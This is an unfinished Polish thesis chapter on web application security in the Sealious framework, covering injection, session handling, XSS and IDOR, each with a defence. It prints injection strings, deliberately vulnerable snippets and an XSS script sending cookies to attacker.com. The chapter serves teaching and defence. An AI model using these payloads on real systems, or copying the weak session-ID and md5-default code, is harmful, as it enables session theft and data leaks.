# Odniesienie się do kwestii bezpieczeństwa i zależności pomiędzy dokumentami w Sealiousie

## Wstęp {.unnumbered}

W dzisiejszych czasach praktycznie co tydzień słyszy się w wiadomościach o wielkich wyciekach danych z mniej lub bardziej popularnych serwisów internetowych---dziury w bezpieczeństwie dostępu do danych odnajdywane są nawet w dużych serwisach, nad którymi pracują tysiące inżynierów i programistów. 

Istnieją dwie główne kategorie podatności aplikacji internetowej na wyciek danych:

* **wadliwe zabezpieczenia struktury IT**---wykorzystywanie dziur w firewallach serwera, łamanie haseł do serwera głównego i inne techniki mogą dać włamywaczowi nieograniczony, bezpośredni dostęp do bazy danych.
* **błąd w kodzie aplikacji internetowej**---przez nieuwagę programisty tworzącego daną aplikację zdarza się, że udostępnia użytkownikom dane, do których nie powinni mieć dostępu.

Zdarza się, że aplikacje o bardzo dobrze zabezpieczonej strukturze IT są podatne na wyciek danych przez błąd programistyczny. W dobie systemów ciągłej integracji, wiecznie rosnącego poziomu skomplikowania aplikacji internetowych i średniego rozmiaru zespołów programistycznych nad nimi pracujących wzrasta prawdopodobieństwo przypadkowego spowodowania wycieku danych.

W tej części pracy opiszę szczegółowo główne typy błędów programistów, które skutkują osłabieniem ochrony danych użytkowników, oraz sposoby, w jakie Sealious im zapobiega lub będzie zapobiegał w przyszłych wersjach^[Należy mieć na uwadze, że Sealious jest frameworkiem do tworzenia nie tylko aplikacji internetowych---może być użyty również jako baza aplikacji *desktopowych*. Biorąc pod uwagę popularność aplikacji webowych w dzisiejszych czasach, opowiem głównie o problemach z bezpieczeństwem w Sieci.].

## *Injection*

*Injection* (ang. "wstrzyknięcie") to rodzaj ataku pozwalający atakującemu na wywołanie dowolnej kwerendy SQL (lub noSQL) na serwerze. Napisana przez atakującego kwerenda może usuwać ważne dane z bazy lub nadawać większe uprawnienia pewnym użytkownikom, co może doprowadzić do wycieku danych.

Podatność na *injection* występuje bardzo często - zajmuje pozycję ##1 na liście najpopularniejszych podatności aplikacji webowych [zob. @owasp_top_ten, p. 7]

### Przebieg ataku

Podstawą ataku typu *injection* jest umiejętne sformułowanie niewinnie wyglądającego zapytania na serwer (np. zapytanie `HTTP POST` odpowiedzialne za logowanie lub zakładanie użytkownika) tak, aby zostały wykonane dodatkowe kwerendy, napisane przez atakującego. 

#### Przykład - SQL

Rozważmy kolejne kroki ataku na przykładzie prostego systemu logowania. W celu autoryzacji loginu i hasła użytkownika serwer musi wykonać zapytanie do bazy danych. Załóżmy, że zapytanie SQL jest formułowane w następujący sposób:

```java
String query = "SELECT * FROM accounts WHERE username='"
     + request.getParameter("username") + "'";
```

Zakładając, że w formularzu HTML została wpisana nazwa użytkownika (zgodnie z przewidywaniami programisty), zapytanie przechowywane w zmiennej `query` ma postać: 

```sql
    SELECT * FROM accounts WHERE username='kuba'
```

Wynikiem takiego zapytania jest jeden wiersz bazy danych, reprezentujący użytkownika `kuba`.

Złośliwy atakujący może w formularzu HTML w polu `username` wpisać:

```
    ' or '1'='1
```

co sprawi, że w zmiennej `query` przechowywane będzie zapytanie w postaci:

```sql
    SELECT * FROM accounts WHERE username='' or '1'='1'
```

Takie zapytanie zamiast zwracać dane jednego użytkownika, zwraca całą zawartość tabeli `accounts` - co może doprowadzić do niepożądanego wycieku danych. 

#### Przykład - NoSQL

Mimo, że języki NoSQL projektowane były z myślą o zapobieganiu atakom typu *injection* [@nosql_prevents_injection], nieuważny programista NoSQL wciąż może sprawić, że jego aplikacja jest na nie podatna [zob. @nosql_injection].

Rozpatrzmy prosty przykład aplikacji, która umożliwia publikowanie oraz przeglądanie postów. W tej aplikacji użytkownik *powinien* mieć dostęp tylko do: 

* postów jego autorstwa
* postów oznaczonych jako publiczne
* postów napisanych przez jego znajomych

Załóżmy, że kod obsługujący zapytanie o listę dostępnych postów zawiera następujący fragment:

```javascript
if (is_friends_with(request.params.user_id, Session.user_id) ) {
    var db_query = "{ $or : [ { public : 1 } , { owner_id : " + 
        request.params.user_id + " } ] }";
    db.posts.find(JSON.parse(db_query));
} else {
    //respond with error
}
```

Jeżeli parametr `user_id` zapytania HTTP obsługiwanego przez ten fragment kodu ma postać zgodną z przewidywaniami programisty (liczbę całkowitą - typ `Number` w JavaScript), zapytanie przechowywane w zmiennej `db_query` ma postać:

```json
{ "$or": [
        { "public": 1 },
        { "author_id": 123 }
    ]
}
```

Takie zapytanie zwróci listę postów z bazy danych - tylko takich, które są publiczne, lub których autorem jest zadany użytkownik

Jeżeli złośliwy atakujący podałby jako wartość parametru `owner_id` ciąg znaków: 

```
123 }, { public: 0
```

to zapytanie przechowywane w zmiennej `db_query` ma postać:

```json
{ "$or": [
        { "public": 1 },
        { "owner_id": 123 },
        { "public": 0}
    ]
}
```

Takie zapytanie zwraca listę *wszystkich* postów z bazy---nastąpił wyciek danych. 

### Zapobieganie

Podatność na ataki typu *injection* jest łatwo wykryć w trakcie czytania kodu---dlatego warto dbać o to, aby każda linijka kodu odpowiedzialna za komunikację z bazą danych w aplikacji internetowej była przejrzana i zaakceptowana przez innego członka zespołu, niż jej autor. 

W przypadku SQL - warto korzystać z poleceń przygotowywanych (ang. *prepared statements*). Polecenia przygotowane są odporne na atak typu *injection*, ponieważ wymagają odseparowania struktury kwerend od danych, co uniemożliwia interpretację danych wpisanych przez użytkownika jako osobnych kwerend.

W przypadku noSQL w dużej mierze wystarczy pilnować, aby kwerenda zawsze była przechowywana w postaci hashmapy, a nie ciągu znaków---bo konkatenacja ciągów znaków umożliwia *injection*.

### Przykłady ataku typu *injection* w dużych aplikacjach

Mimo, że o podatności na ataki typu *injection* traktuje bardzo wiele kursów o bezpieczeństwie aplikacji internetowych^[potrzebne cytaty], to wciąż notorycznie słyszy się o poważnych w skutkach atakach osiągniętych przez wykorzystywanie właśnie tej dziury w zabezpieczeniach:

* słynny atak LulzSec na sieć PlayStation Network - w wyniku którego atakujący zyskali pełen dostęp do bazy danych i kodu źródłowego serwisu [@lulz_sec_sony]
* w 2009 roku pewien Amerykanin wykradł dane kart kredytowych 130 milionów obywateli za pomocą *SQL injection* [@130m_cards]

### Jak Sealious zapobiega atakom typu *injection*

Sealious reprezentuje wszystkie zapytania do bazy danych w postaci natywnego dla JavaScript obiektu (hashmapy), zgodnych ze specyfikacją interfejsu programistycznego MongoDB. Każde zapytanie MongoDB jest hashmapą - dlatego np. dla pól typu "`text`" każda wysłana przez użytkownika *wartość pola* jest wcześniej rzutowana na `String`. Takie podejście uniemożliwia zajście sytuacji opisanej powyżej. Takie rzutowanie na typ `String` możemy zaobserwować w poniższym fragmencie kodu^[kod pochodzi z pliku `lib/base-chips/field_type.text.js`, w kodzie źródłowym Sealiousa z wersji `0.6.21`]:

```javascript
if (value_in_code instanceof Object) {
    return JSON.stringify(value_in_code);
} else if (value_in_code === null) {
    return null
} else {
    return value_in_code.toString();
}
```

Dodatkowo, Sealious jest napisany w taki sposób, że docelowy deweloper tworzący aplikację przy jego użyciu nie musi własnoręcznie formułować kwerend do bazy danych - co eliminuje ryzyko przypadkowego uczynienia tej aplikacji podatną na noSQL injection.




## Błędy w autentykacji i zarządzaniu sesją

W trakcie tworzenia aplikacji deweloperzy często ulegają pokusie stworzenia własnego procesu autentykacji użytkownika. Nie jest to łatwe zadanie, dlatego potencjalnie taka aplikacja jest podatna na ataki, w których złośliwy agent podszywa się pod uprzywilejowanego użytkownika.

### Przebieg ataku

#### Ujawnienie id sesji

Należy pamiętać, że id sesji jednoznacznie identyfikuje użytkownika i trzeba dbać o to, aby nie zostało ono ujawnione. Rozpatrzmy przebieg ataku na przykładzie hipotetycznej sieci społecznościowej.

1. Użytkownik A loguje się do interfejsu webowego pewnej sieci społecznościowej.

2. Użytkownik A znalazł opublikowane przez kogoś na tym serwisie bardzo śmieszne zdjęcie kota.
 
3. Widoczny w pasku adresu przeglądarki URL zawiera identyfikator sesji użytkownika: 
   
    http://example.com/pics/7553?**jsessionid=9cdfb439c7876e**
 
4. Użytkownik A zechciał podzielić się radością płynącą z tego zdjęcia ze swoim znajomym, użytkownikiem B, więc skopiował URL z paska adresu i wkleił go do treści wiadomości email, po czym wysłał ją.
 
5. Użytkownik B wiadomości otwiera zawarty w tej wiadomości link.
 
6. Serwer odbiera zapytanie wywołane przez otwarcie przez użytkownika B tego linku, wczytuje id sesji z URL i rozpoznaje w nim użytkownika A.
 
7. Użytkownik B jest zalogowany do sieci społecznościowej jako użytkownik A.

#### Wyciek haseł
 
Osoba mająca fizyczny dostęp do bazy danych danej aplikacji (lub zdalny dostęp, za pomocą ataku typu *injection*) może wczytać zawartość tabeli przechowującej dane logowania użytkowników. 

Jeżeli hasła te są przechowywane w postaci jawnego tekstu, atakujący może od razu użyć ich, aby zalogować się jako dowolny użytkownik z pozyskanej tabeli.

### Zapobieganie

#### Zapobieganie ujawnieniu id sesji

ID sesji powinno być traktowane jako sekret. Podjęcie następujących kroków zdecydowanie utrudnia atakującemu jego przechwycenie:

* **wymuszenie korzystania z protokołu `HTTPS` do wszystkich zapytań związanych z obsługą sesji**

    Dane wysyłane za pośrednictwem protokołu `HTTPS` są szyfrowane, co utrudnia (ale nie uniemożliwia[^ssl_breakable_footnotes]) ich przechwycenie.

[^ssl_breakable_footnotes]: Odpowiednio zainfekowane maszyny są w stanie umożliwić ataki typu Man-In-The-Middle nawet dla połączeń HTTPS [zob. @superfish_ssl]

* **przechowywanie identyfikatora sesji w pliku cookie zamiast w URL**
    
    Jest to bardzo skuteczny sposób zabezpieczenia użytkownika przed przypadkowym samodzielnym zdradzeniem komuś swojego identyfikatora sesji. Raz zapisana w pliku cookie wartość jest automatycznie dołączana przez przeglądarkę internetową do każdego zapytania kierowanego do danej aplikacji, co znosi też z programisty obowiązek upewniania się, że w zapytaniu nie brakuje owego id.
    


#### Zapobieganie wyciekaniu haseł

Aby zapobiec wyciekom haseł, można przechowywać w bazie danych wartości pewnej funkcji hashującej dla każdego hasła, zamiast haseł w postaci jawnego tekstu. Wtedy przy próbie logowania wystarczy porównać wartość tej funkcji dla podanego przez użytkownika hasła z wartością przechowywaną w bazie.

Często^[zob. https://github.com/search?q=md5%28password%29&type=Code] używaną funkcją haszującą hasła jest `md5` - mimo, że zostało wielokrotnie[^md5_bad_przypisy] udowodnione, że nie jest to funkcja odporna na kolizje[^co_to_kolizja]. Organizacja *Internet Engineering Task Force* zaleca korzystania z algorytmu `PBKDF2` [zob. @pbkdf2_recommended]

[^md5_bad_przypisy]: m.in. [@md5_not_suitable_ms], [@md5_not_suitable]

[^co_to_kolizja]: "Kolizja" oznacza możliwość wygenerowania w realistycznym czasie ciągu znaków, dla którego dana funkcja haszująca przyjmuje wartość identyczną z zadanym haszem (np. skradzionym z bazy danych). 

Niestety jeżeli atakujący zyska dostęp do zahaszowanych haseł, może użyć ogólnie dostępnych [@rainbow_tables] tablic wartości danej funkcji haszującej do błyskawicznego odgadnięcia haseł (tzw. *rainbow tables*).

Można się przed tym zabezpieczyć używając tzw. "solenia" (ang. *salting*). Proces ten polega na wstępnej modyfikacji tekstu przed obliczeniem dla niego wartości funkcji haszującej^[potrzebny cytat z książki o kryptografii], co utrudnia wykorzystywanie *rainbow tables* do łamania haseł.

### Zarządzanie sesją w Sealiousie[^channel_responsibility_footnote]

#### Bezpieczeństwo identyfikatora sesji

[^channel_responsibility_footnote]: Sealious w obecnych odsłonach (wersja `0.6.21-stable` i wersja `0.7-alpha`, stan ze stycznia 2016) nie zawiera mechanizmu sesji - aktualna struktura naszego frameworka wymaga, aby to chipy typu *channel* implementowały swój mechanizm weryfikacji identyfikatora sesji. Części tej sekcji odnoszące się do protokołów `http`(`s`) i plików *cookies* tyczą się konkretnego pluginu do Sealiousa - `sealious-www-server`.

`sealious-www-server`, plugin pozwalający na komunikację z aplikacją Sealiousową za pomocą protokołów `HTTP` i `HTTPS`, ułatwia konfigurację szyfrowania SLL---wystarczy tylko podać adresy portów:

```javascript
Sealious.ConfigManager.set_config(
    "chip.channel.www_server", {
        connections: {
            https: {
                port: 4430,
                tls: {
                    key: fs.readFileSync("sealious.key"),
                    cert: fs.readFileSync("sealious.crt")
                }
            }
        }
    }
)
```

`sealious-www-server` nie może domyślnie włączać `HTTPS`, gdyż wymagany do działania tego protokołu jest podpisany certyfikat `TLS`---stąd potrzeba ręcznej konfiguracji.

Po udanym zalogowaniu identyfikator sesji jest generowany losowo i haszowany za pomocą algorytmu sha1^[poniższy przykład kodu pochodzi z pliku `define/channel.www_server.js` z repozytorium `Sealious/sealious-www-server`]:

```javascript
function generate_session_id() {
    var seed = Math.random().toString();
    var session_id = sha1(seed);
    return session_id;
}
```

Następnie wpisywany jest do nagłówka odpowiedzi HTTP instruującego przeglądarkę do utworzenia nowego wpisu w pliku cookie:

```javascript
if(request.payload.redirect_success){
    reply()
        .state('SealiousSession', session_id)
        .redirect(request.payload.redirect_success);
}else{
    reply("http_session: Logged in!")
        .state('SealiousSession', session_id);
}
```

#### Bezpieczeństwo haseł użytkowników

Pole `password` w zasobie typu `user` w Sealiousie jest obsługiwane przez `field_type.hashed_text`. Ten typ pola generuje hash hasła użytkownika używając zalecanego przez organizację *Internet Engineering Task Force* [zob. @pbkdf2_recommended] algorytmu `PBKDF2`:

```javascript
encode: function(context, params, value_in_code){
    var salt = "", algorithm = "md5";
    if (params) {
        if (params.salt) {
            salt = params.salt;
        }
        else if (params.algorithm) {
            algorithm = params.algorithm;
        }
    }
    return new Promise(function(resolve, reject){
        crypto.pbkdf2(
            value_in_code, salt, 
            4096, 64, algorithm, 
            function(err, key){
                err ? reject(err) : resolve(key.toString('hex'));
            }
        );
    })
}
```

Zabezpiecza to hasła użytkowników przed złamaniem w wypadku wycieku informacji z bazy danych.

## Cross-Site Scripting (XSS)

Ataki typu XSS wykorzystują interpreter HTML przeglądarki do uruchamiania arbitralnych skryptów, które mają pełen dostęp do danych sesyjnych użytkownika i mogą spowodować ich wyciek. Zapobieganie im nie należy do najtrudniejszych, ale podatności na XSS są wciąż bardzo powszechne^[[zob. @owasp_top_ten]].

### Przebieg ataku

Rozpatrzmy przebieg XSS na przykładzie webowego, opartego o AJAX^[Korzystanie z modelu AJAX w aplikacjach webowych często jest przyczyną podatności na XSS [@ajax_guide] - na szczęście często jesteśmy w stanie im w pełni zapobiec odpowiednio konfigurując wyłącznie backend aplikacji], interfejsu sieci społecznościowej. 

Kod pobierający najnowsze posty użytkowników może mieć postać:

```javascript
var post_container = document.getElementById("posts");
request.get("/newest_posts.php", function(posts){
    posts.forEach(function(post){
        var post_div = document.createElement("div");
        post_div.classList.add("user-post");
        post_div.innerHTML = post.body;
        post_container.appendChild(post_div);
    })
});
```

Następnie, jeżeli serwer nie zapobiega XSS, wystarczy, aby któryś z użytkowników rozpatrywanej aplikacji utworzył post o treści:

```html
<div>
Jestem złośliwym użytkownikiem
</div>
<script>
document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='
   + document.cookie
</script>
```

aby każdy z użytkowników, któremu wyświetli się post atakującego został przekierowany na złośliwą stronę, która przechwytuje id sesji - co umożliwia atakującemu podszycie się pod tego użytkownika.

### Jak Sealious zapobiega XSS

Domyślnie zainstalowany w Sealiousie typ pola `text` korzysta z modułu `sanitize-html` aby usuwać z inputu użytkownika potencjalnie złośliwe skrypty^[poniższy fragment kodu pochodzi z pliku `lib/base-chips/field-type.text.js` z repozytorium sealious/sealious]: 

```javascript
var field_type_text = new Sealious.FieldType({
    name: "text",
    /*
    (...)
    */
    encode: function(context, params, value_in_code){
        if (!params && params.strip_html !== false) {
            var stripped = sanitizeHtml(value_in_code.toString(), {
                allowedTags: []
            })
            return Promise.resolve(stripped);
        } else {
            if (value_in_code instanceof Object) {
                return Promise.resolve(JSON.stringify(value_in_code));
            } else if (value_in_code === null) {
                return Promise.resolve(null);
            } else {
                return Promise.resolve(value_in_code.toString());
            }
        }
    }
});
```

Dzięki temu opisany powyżej input złośliwego użytkownika zostałby w aplikacji Sealiousowej przed zapisaniem do bazy danych zamieniony na:

```
Jestem złośliwym użytkownikiem
```

Tekst ten jest pozbawiony tagów `<script>` (wraz z ich zawartością), co uniemożliwia XSS. 

## Insecure Direct Object Reference

Podatność aplikacji na *Insecure Direct Object Reference* (*"niezabezpieczone bezpośrednie odwołanie do obiektu"*) oznacza, że użytkownik może uzyskać dostęp do zasobu, który powinien być przed nim ukryty, podmieniając tylko identyfikator tego zasobu w `URL` lub w parametrze zdalnego wywołania metody serwera.

Automatyczne testy nie mogą łatwo wykryć podatności tego typu, gdy aplikacja nie posiada deklaratywnego opisu tego, który użytkownik ma dostęp do jakiego zasobu^[bez takiego opisu wnioskowanie nt. uprawnień użytkowników do konkretnych zasobów może być dokonane tylko poprzez czytanie *imperatywnego* kodu aplikacji - co wymaga intuicji ludzkiej].

Podatność ta nie jest bardzo "medialna"^[14 tyś. wyników w Google Search dla zapytania "insecure direct object reference" vs 1,14 *mln*  dla zapytania "sql injection"], ale potrafi być dotkliwa w skutkach i mieć miejsce nawet w popularnych, dużych aplikacjach [zob. @facebook_idor].

### Przebieg ataku z wykorzystaniem *Insecure Direct Object Reference*

Odsłonięcie aplikacji na atak typu *Insecure Direct Object Reference* następuje, gdy udostępnia ona jakiś zasób pod URL-em, który zawiera identyfikator wczytywanego zasobu---ale nie weryfikuje, czy użytkownik, który wywołuje to zapytanie, ma dostęp do tego zasobu.

Rozpatrzmy tę podatność na przykładzie hipotetycznej aplikacji, która przechowuje poufne dane o użytkownikach. Oto fragment jej kodu, odpowiedzialny za tworzenie zapytania SQL do bazy danych:

```java
String query = "SELECT * FROM user_data WHERE user_id = ?";
PreparedStatement pstmt =
    connection.prepareStatement(query , ... );
pstmt.setString( 1, request.getParameter("user_id"));
ResultSet results = pstmt.executeQuery( );
```

Atakujący musi tylko podmienić wartość parametru `user_id` w zapytaniu do serwera, aby uzyskać dostęp do poufnych danych innego użytkownika:

```
GET /app/confidentialUserInfo?user_id=nie_moje_id
```

### Zapobieganie podatności na *Insecure Direct Object Reference*

Istnieją dwa główne podejścia zapobiegania tego typu podatności na atak:

1. **Unikanie bezpośrednich odwołań do zasobów**
    
    Można zamiast bezpośrednich odwołań do zasobów korzystać z identyfikatorów obowiązujących tylko dla danej sesji/użytkownika. Przykładowo - do zaznaczania, który z 6-ciu dostępnych dla danego użytkownika zasobów został przez niego wybrany, zamiast używania identyfikatora zasobu z bazy danych jako parametru URL można używać liczb 1-6. Aplikacja musi wtedy mapować każdą z tych liczb na faktyczny identyfikator w bazie danych, unikalnie dla każdego użytkownika.

2. **Sprawdzanie praw dostępu przy każdym bezpośrednim odwołaniu do zasobu**

    Jeżeli aplikacja jest napisana tak, że przy *każdym* bezpośrednim odwołaniu sprawdza, czy użytkownik wykonujący zapytanie ma do danego zasobu prawo dostępu, to jest odporna na *Insecure Direct Object Reference*. Niestety w aplikacjach bogatych w różnorakie sposoby dostępu do danych trudno jest upewnić się, że żadne bezpośrednie odwołanie nie zostało pominięte. 

### Jak Sealious zapobiega podatności na *Insecure Direct Object Reference*

Struktura Sealiousa została zaprojektowana z myślą o zapobieganiu podatności aplikacji na ataki typu *Insecure Direct Object Reference*. Dzięki temu nasz framework posiada następujące cechy:

1. aplikacja pisana przy pomocy Sealiousa musi zawierać deklaratywny opis jej struktury i uprawnień użytkowników. Opis ten musi jednoznacznie stwierdzać, jacy użytkownicy i w jakich okolicznościach mogą wykonywać określone metody na konkretnym zasobie. Rozpatrzmy przykład opisu aplikacji Sealiousowej:

    ```javascript
     1 new Sealious.ResourceType({
     2    name: "post",
     3    fields: [
     4        {name: "title", type: "text", params: {max_length: 80}},
     5        {name: "body", type: "text"}
     6   ],
     7    access_strategy: {
     8        create: "logged_in",
     9        retrieve: "public",
    10        default: "just_owner"
    11    }
    12 })
    ```

    Powyższy przykład kodu stanowi opis^[proszę zwrócić uwagę, że poza  koniecznymi wywołaniami `Sealious.init` i `Sealious.start` opis ten stanowi całość kodu potrzebnego do jej uruchomienia i poprawnego działania] prostej aplikacji Sealiousowej, w której:

    * istnieje typ zasobu `post`, który ma pola `title` oraz `body` (linijki 4 i 5)
    * tylko zalogowany użytkownik może tworzyć zasoby typu `post` (linijka 9)
    * wszystkie zasoby typu `post` są publicznie dostępne, nawet dla niezalogowanych użytkowników (linijka 9)
    * edytować oraz usuwać konkretne zasoby typu `post` może tylko ich twórca (linijka 10^[wartość `just_owner` dla klucza `default` w mapie `access_strategy` oznacza, że dla każdej metody, która nie została określona, należy użyć strategii dostępu `just_owner`])

    Deklaratywny opis aplikacji ułatwia testowanie jej zabezpieczeń - ponieważ zamierzenia programisty odnośnie uprawnień użytkowników są w nim bezpośrednio zawarte i nie muszą być zgadywane w trakcie czytania imperatywnego kodu.

2. identyfikatory zasobów w Sealiousie nie są przewidywalne.
    
    Sealious, zgodnie z rekomendacją *Internet Engineering Task Force* [@uuid_rfc] używa UUID zamiast liczb całkowitych do jednoznacznej identyfikacji zasobu. Uniemożliwia to przewidzenie identyfikatorów istniejących zasobów

3. **każda metoda służąca do odczytu lub modyfikacji zasobu w Sealiousie jest wrażliwa na kontekst, w którym została wykonana.**

    Aplikacja Sealiousowa po otrzymaniu dowolnego zapytania od użytkownika generuje obiekt reprezentujący *kontekst* tego zapytania. Kontekst zawiera informacje o:

    * id użytkownika, który dokonał zapytania (`undefined`, jeżeli jest to użytkownik niezalogowany)
    * czasie otrzymania zapytania (w postaci liczby całkowitej - ilości milisekund od 1 stycznia 1970 GMT)
    * adresie IP, z którego przyszło zapytanie (tylko w kontekście aplikacji webowych^[przypominam, że Sealious może też być wykorzystany do tworzenia aplikacji desktopowych])

    **Następnie obiekt ten jest podawany jako argument do każdej metody związanej z zarządzaniem zasobami, która jest wywołana w trakcie generowania odpowiedzi na zapytanie użytkownika.**

    Każda z wrażliwych na kontekst metod sprawdza, czy wykonywana przez nią operacja jest dozwolona w danym kontekście. W przypadku decyzji negatywnej rzuca błąd, w przypadku decyzji pozytywnej wykonuje się dalej i podaje dany jej obiekt reprezentujący kontekst do każdej wywoływanej przez nią wrażliwej na kontekst metody.

    Przykładem metody wrażliwej na kontekst jest metoda `create_resource` należąca do subjectu `ResourceTypeCollection`:

    ```javascript
    ResourceTypeCollection.prototype.create_resource = 
      function(context, body ){
        var self = this;

        return self.resource_type
          .check_if_action_is_allowed(context, "create")
        .then(function(){
            return self.resource_type
              .validate_field_values(context, true, body);
        }).then(function(){
            return self.resource_type
              .encode_field_values(context, body);
        }).then(function(encoded_body){
            var newID = UUIDGenerator(10);
            var resource_data = {
                sealious_id: newID,
                type: self.resource_type.name,
                body: encoded_body,
                created_context: context.toObject(),
                last_modified_context: context.toObject()
            };
            return Sealious.Datastore
              .insert("resources", resource_data, {});
        }).then(function(database_entry){
            return self.resource_type
              .decode_db_entry(context, database_entry);
        })
    }
    ```

    Jak widać, metoda ta najpierw sprawdza, czy jest dozwolona w obecnym kontekście (`resource_type.check_if_action_is_allowed(context, "create")`), a następnie wielokrotnie podaje dalej dany jej kontekst do wywoływanych przez nią funkcji, (np. w `self.resource_type.validate_field_values(context, true, body)`).

    Dzięki takiemu podejściu żaden użytkownik nie dostanie dostępu do zasobu, do którego nie ma uprawnień. Fakt, że jeden kontekst jest przekazywany wgłąb do każdego wywołania metody umożliwia tworzenie skomplikowanych relacji pomiędzy zasobami i dynamiczne generowanie adresów url do zagnieżdżonych zasobów bez troski o bezpieczeństwo danych. Rozpatrzmy to na przykładzie deklaratywnego opisu hipotetycznego serwisu społecznościowego:

    ```javascript
    new Sealious.ResourceType({
        name: "person",
        fields: [
            {name: "given_name", type: "text", params: {max_length: 20}},
            {name: "surname", type: "text", params: {max_length: 25}},
            {name: "friends", type: "reference", params:{
                resource_type: "person",
                multiplicity: "many-to-many"
            }}
        ],
        access_strategy: {
            default: "just_owner",
            retrieve: "owner_or_friends"
        }
    })

    new Sealious.AccessStrategy({
        name: "owner_or_friends",
        item_sensitive: true,
        checker_function: function(context, item){
            var are_friends = false;
            item.body.friends.forEach(function(friend){
                
            })
        }
    })
    ```

//missing function level Access Control

// Steam

# Bibliografia